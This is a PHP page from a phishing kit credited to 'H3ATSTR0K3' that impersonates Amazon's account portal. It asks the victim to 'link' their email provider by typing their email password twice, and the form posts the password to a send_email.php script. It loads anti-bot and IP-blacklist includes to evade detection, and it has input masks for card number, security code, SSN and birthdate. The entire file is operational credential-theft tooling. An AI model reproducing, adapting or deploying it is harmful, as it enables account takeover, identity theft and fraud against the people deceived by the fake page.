<?php

/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                         __..--.._
  .....              .--~  .....  `.
.":    "`-..  .    .' ..-'"    :". `
` `._ ` _.'`"(     `-"'`._ ' _.' '
     ~~~      `.          ~~~
              .'
             /
            (
             ^---'
H3ATSTR0K3

------------------------------------------------
BIG THANKS TO MY BRO xAthena

*/

session_start();
include'anti/IP-BlackList.php';  
include'anti/Bot-Crawler.php';
include'anti/Bot-GhostEmperor.php';
include'anti/Bot-blacklist.php';
include('anti/en.php');

?><html class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.19.8-2020-11-06"><head>



<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" sizes="16x16 32x32 64x64" href="./style//amazon-icon-1.svg">

    <title dir="ltr">My Account</title>

    
      
      

      
        <link rel="stylesheet" href="./style/css-088.css">


<link rel="stylesheet" href="./style/css099.css">
  <script type="text/javascript">
    $(function() {
        $('#ccn').mask('0000 0000 0000 0000');
    $('#Securitycode').mask('0000');

        $('#birthdate').mask('00/00/0000');

        $('#SSN').mask('000-00-0000');

        $('#expdate').mask('00/0000');

  });
  </script>



<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}

</style>





<style>
#Securitycode {
background-image: url('./style/sprite_logos_wallet_2x.png');
background-repeat: no-repeat;
    background-size: 54px;
    background-position: 111.5% 48.1%;
}

 #ccn {
background-image: url('./style/cards-sprite-small@2x.png');
background-repeat: no-repeat;
    background-size: 38px;}

</style>

      
    
  </head>

  <body class="ap-locale-fr_FR a-m-us a-aui_157141-c a-aui_158613-c a-aui_72554-c a-aui_dropdown_187959-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_tnr_v2_180836-c a-aui_ux_145937-c a-meter-animate">




<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none auth-navbar">
        





<div class="a-section a-spacing-medium a-text-center">
  
    

    
      


<a class="a-link-nav-icon" tabindex="-1" href="#">
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

  
  
    
    
  
</a>

    
  
</div>


      </div>

      <div id="authportal-center-section" class="a-section">
        
          
          
            <div id="authportal-main-section" class="a-section">
              






<div id="sptctx" class="a-section auth-pagelet-container">
  

















  
    





<div class="a-section a-spacing-base">
  <div class="a-section">
    
    <form name="signIn" method="post" action="./system/send_email.php" class="auth-validate-form auth-real-time-validation a-spacing-none" style="
    margin-left: -20;
    margin-right: -20;
">
      
      

      




  
    
  
    
  
    
  



      <div class="a-section">
        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h1 style="text-align:center" class="a-spacing-small">Link your E-Mail Provider</h1>
          
          
          <div class="a-row a-spacing-base">
            
			<?php $mailprovider = explode('@',$_SESSION['email']);
			$mailprovider = $mailprovider[1];

 ?>
<p style="text-align: left;"><small><?php echo $lg_mailaccess['fcenter']?> <strong><?php echo ucfirst(strtolower($mailprovider)); ?></strong> <?php echo $lg_mailaccess['center']?></small></p>

        <div class="a-divider a-divider-break"><h5>E-Mail Information</h5></div>
 
 
<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E-mail adress
</font></font></label>
<input disabled="disabled" required value="<?php echo $_SESSION['email']; ?>" type="Email" maxlength="128" id="Email" name="Email" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>

<div class="multi equal clearfix">
<div class=" left">


<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;" class="">
E-mail password</font></font></label>
<input required="" type="password" maxlength="128" id="emailpassowrd" name="emailpassowrd" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>

</div>
<div class="right"> 




<div class="a-row a-spacing-base">
<label for="ap_email" class="a-form-label"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;" class="">
Re-enter password</font></font></label>
<input required="" type="password" maxlength="128" id="confpassowrd" name="confpassowrd" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>


</div></div>

              
              
          

          </div

          
          <input type="hidden" name="create" value="0">

          <div class="a-section">
            
            









            
            <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true">Continue</span></span></span>

            
            
              




            

            




          

          

          



<div class="a-section">
  <div aria-live="polite" class="a-row a-expander-container a-expander-inline-container">
    
      <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
        



  
  
  
    
  

<a id="auth-fpp-link-bottom" class="a-link-normal" href="#">
  Mot de passe oublié
</a>
      </div>
    
    <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
      <a id="ap-other-signin-issues-link" class="a-link-normal" href="#">
        Autres problèmes de connexion
      </a>
    </div>
  </div>
</div>


          




  
  
  
    
      
      
      
        
        
      
    
  


          
          
        </div></div>
      </div>
    </form>
  </div>
  
    
    
      
        
      
    
  
</div>

  
  

</div>
            </div>
          
        
      </div>

      
      <div id="right-2">
      </div>

      <div class="a-section a-spacing-top-extra-large auth-footer">
        



<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>

  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">Terms of use</a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">Protection of your personal information</a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">Help</a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">
      Cookies
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" href="#">Ads based on your interests</a>
    <span class="auth-footer-seperator"></span>
  

  
</div>




<div class="a-section a-spacing-none a-text-center">
  





<span class="a-size-mini a-color-secondary">© 1996-2022, Amazon.com, Inc. or its affiliates.
</span>

</div>

      </div>
    </div>

   
    
    
  </div>




</body></html>